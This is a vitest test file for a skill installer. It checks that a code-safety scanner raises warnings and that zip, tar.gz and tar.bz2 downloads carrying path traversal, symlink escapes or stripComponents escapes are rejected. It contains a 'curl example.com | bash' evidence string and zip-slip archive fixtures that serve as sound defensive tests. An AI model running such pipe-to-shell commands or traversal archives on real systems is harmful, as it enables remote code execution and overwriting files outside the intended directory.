import JSZip from "jszip";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import * as tar from "tar";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { installSkill } from "./skills-install.js";

const runCommandWithTimeoutMock = vi.fn();
const scanDirectoryWithSummaryMock = vi.fn();
const fetchWithSsrFGuardMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../infra/net/fetch-guard.js", () => ({
  fetchWithSsrFGuard: (...args: unknown[]) => fetchWithSsrFGuardMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../security/skill-scanner.js")>();
  return {
    ...actual,
    scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
  };
});

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

async function writeDownloadSkill(params: {
  workspaceDir: string;
  name: string;
  installId: string;
  url: string;
  archive: "tar.gz" | "tar.bz2" | "zip";
  stripComponents?: number;
  targetDir: string;
}): Promise<string> {
  const skillDir = path.join(params.workspaceDir, "skills", params.name);
  await fs.mkdir(skillDir, { recursive: true });
  const meta = {
    openclaw: {
      install: [
        {
          id: params.installId,
          kind: "download",
          url: params.url,
          archive: params.archive,
          extract: true,
          stripComponents: params.stripComponents,
          targetDir: params.targetDir,
        },
      ],
    },
  };
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${params.name}
description: test skill
metadata: ${JSON.stringify(meta)}
---

# ${params.name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

async function fileExists(filePath: string): Promise<boolean> {
  try {
    await fs.stat(filePath);
    return true;
  } catch {
    return false;
  }
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    fetchWithSsrFGuardMock.mockReset();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
  });

  it("adds detailed warnings for critical findings and continues install", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("warns and continues when skill scan fails", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(true);
      expect(result.warnings?.some((warning) => warning.includes("code safety scan failed"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("Installation continues"))).toBe(
        true,
      );
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});

describe("installSkill download extraction safety", () => {
  beforeEach(() => {
    runCommandWithTimeoutMock.mockReset();
    scanDirectoryWithSummaryMock.mockReset();
    fetchWithSsrFGuardMock.mockReset();
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 0,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("rejects zip slip traversal", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const outsideWriteDir = path.join(workspaceDir, "outside-write");
      const outsideWritePath = path.join(outsideWriteDir, "pwned.txt");
      const url = "https://example.invalid/evil.zip";

      const zip = new JSZip();
      zip.file("../outside-write/pwned.txt", "pwnd");
      const buffer = await zip.generateAsync({ type: "nodebuffer" });

      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(buffer, { status: 200 }),
        release: async () => undefined,
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "zip-slip",
        installId: "dl",
        url,
        archive: "zip",
        targetDir,
      });

      const result = await installSkill({ workspaceDir, skillName: "zip-slip", installId: "dl" });
      expect(result.ok).toBe(false);
      expect(await fileExists(outsideWritePath)).toBe(false);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("rejects tar.gz traversal", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const insideDir = path.join(workspaceDir, "inside");
      const outsideWriteDir = path.join(workspaceDir, "outside-write");
      const outsideWritePath = path.join(outsideWriteDir, "pwned.txt");
      const archivePath = path.join(workspaceDir, "evil.tgz");
      const url = "https://example.invalid/evil";

      await fs.mkdir(insideDir, { recursive: true });
      await fs.mkdir(outsideWriteDir, { recursive: true });
      await fs.writeFile(outsideWritePath, "pwnd", "utf-8");

      await tar.c({ cwd: insideDir, file: archivePath, gzip: true }, [
        "../outside-write/pwned.txt",
      ]);
      await fs.rm(outsideWriteDir, { recursive: true, force: true });

      const buffer = await fs.readFile(archivePath);
      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(buffer, { status: 200 }),
        release: async () => undefined,
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "tar-slip",
        installId: "dl",
        url,
        archive: "tar.gz",
        targetDir,
      });

      const result = await installSkill({ workspaceDir, skillName: "tar-slip", installId: "dl" });
      expect(result.ok).toBe(false);
      expect(await fileExists(outsideWritePath)).toBe(false);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("extracts zip with stripComponents safely", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const url = "https://example.invalid/good.zip";

      const zip = new JSZip();
      zip.file("package/hello.txt", "hi");
      const buffer = await zip.generateAsync({ type: "nodebuffer" });
      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(buffer, { status: 200 }),
        release: async () => undefined,
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "zip-good",
        installId: "dl",
        url,
        archive: "zip",
        stripComponents: 1,
        targetDir,
      });

      const result = await installSkill({ workspaceDir, skillName: "zip-good", installId: "dl" });
      expect(result.ok).toBe(true);
      expect(await fs.readFile(path.join(targetDir, "hello.txt"), "utf-8")).toBe("hi");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("rejects tar.bz2 traversal before extraction", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const url = "https://example.invalid/evil.tbz2";

      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(new Uint8Array([1, 2, 3]), { status: 200 }),
        release: async () => undefined,
      });

      runCommandWithTimeoutMock.mockImplementation(async (argv: unknown[]) => {
        const cmd = argv as string[];
        if (cmd[0] === "tar" && cmd[1] === "tf") {
          return { code: 0, stdout: "../outside.txt\n", stderr: "", signal: null, killed: false };
        }
        if (cmd[0] === "tar" && cmd[1] === "tvf") {
          return {
            code: 0,
            stdout: "-rw-r--r--  0 0 0 0 Jan  1 00:00 ../outside.txt\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "xf") {
          throw new Error("should not extract");
        }
        return { code: 0, stdout: "", stderr: "", signal: null, killed: false };
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "tbz2-slip",
        installId: "dl",
        url,
        archive: "tar.bz2",
        targetDir,
      });

      const result = await installSkill({ workspaceDir, skillName: "tbz2-slip", installId: "dl" });
      expect(result.ok).toBe(false);
      expect(
        runCommandWithTimeoutMock.mock.calls.some((call) => (call[0] as string[])[1] === "xf"),
      ).toBe(false);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("rejects tar.bz2 archives containing symlinks", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const url = "https://example.invalid/evil.tbz2";

      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(new Uint8Array([1, 2, 3]), { status: 200 }),
        release: async () => undefined,
      });

      runCommandWithTimeoutMock.mockImplementation(async (argv: unknown[]) => {
        const cmd = argv as string[];
        if (cmd[0] === "tar" && cmd[1] === "tf") {
          return {
            code: 0,
            stdout: "link\nlink/pwned.txt\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "tvf") {
          return {
            code: 0,
            stdout: "lrwxr-xr-x  0 0 0 0 Jan  1 00:00 link -> ../outside\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "xf") {
          throw new Error("should not extract");
        }
        return { code: 0, stdout: "", stderr: "", signal: null, killed: false };
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "tbz2-symlink",
        installId: "dl",
        url,
        archive: "tar.bz2",
        targetDir,
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "tbz2-symlink",
        installId: "dl",
      });
      expect(result.ok).toBe(false);
      expect(result.stderr.toLowerCase()).toContain("link");
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("extracts tar.bz2 with stripComponents safely (preflight only)", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const url = "https://example.invalid/good.tbz2";

      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(new Uint8Array([1, 2, 3]), { status: 200 }),
        release: async () => undefined,
      });

      runCommandWithTimeoutMock.mockImplementation(async (argv: unknown[]) => {
        const cmd = argv as string[];
        if (cmd[0] === "tar" && cmd[1] === "tf") {
          return {
            code: 0,
            stdout: "package/hello.txt\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "tvf") {
          return {
            code: 0,
            stdout: "-rw-r--r--  0 0 0 0 Jan  1 00:00 package/hello.txt\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "xf") {
          return { code: 0, stdout: "ok", stderr: "", signal: null, killed: false };
        }
        return { code: 0, stdout: "", stderr: "", signal: null, killed: false };
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "tbz2-ok",
        installId: "dl",
        url,
        archive: "tar.bz2",
        stripComponents: 1,
        targetDir,
      });

      const result = await installSkill({ workspaceDir, skillName: "tbz2-ok", installId: "dl" });
      expect(result.ok).toBe(true);
      expect(
        runCommandWithTimeoutMock.mock.calls.some((call) => (call[0] as string[])[1] === "xf"),
      ).toBe(true);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });

  it("rejects tar.bz2 stripComponents escape", async () => {
    const workspaceDir = await fs.mkdtemp(path.join(os.tmpdir(), "openclaw-skills-install-"));
    try {
      const targetDir = path.join(workspaceDir, "target");
      const url = "https://example.invalid/evil.tbz2";

      fetchWithSsrFGuardMock.mockResolvedValue({
        response: new Response(new Uint8Array([1, 2, 3]), { status: 200 }),
        release: async () => undefined,
      });

      runCommandWithTimeoutMock.mockImplementation(async (argv: unknown[]) => {
        const cmd = argv as string[];
        if (cmd[0] === "tar" && cmd[1] === "tf") {
          return { code: 0, stdout: "a/../b.txt\n", stderr: "", signal: null, killed: false };
        }
        if (cmd[0] === "tar" && cmd[1] === "tvf") {
          return {
            code: 0,
            stdout: "-rw-r--r--  0 0 0 0 Jan  1 00:00 a/../b.txt\n",
            stderr: "",
            signal: null,
            killed: false,
          };
        }
        if (cmd[0] === "tar" && cmd[1] === "xf") {
          throw new Error("should not extract");
        }
        return { code: 0, stdout: "", stderr: "", signal: null, killed: false };
      });

      await writeDownloadSkill({
        workspaceDir,
        name: "tbz2-strip-escape",
        installId: "dl",
        url,
        archive: "tar.bz2",
        stripComponents: 1,
        targetDir,
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "tbz2-strip-escape",
        installId: "dl",
      });
      expect(result.ok).toBe(false);
      expect(
        runCommandWithTimeoutMock.mock.calls.some((call) => (call[0] as string[])[1] === "xf"),
      ).toBe(false);
    } finally {
      await fs.rm(workspaceDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});
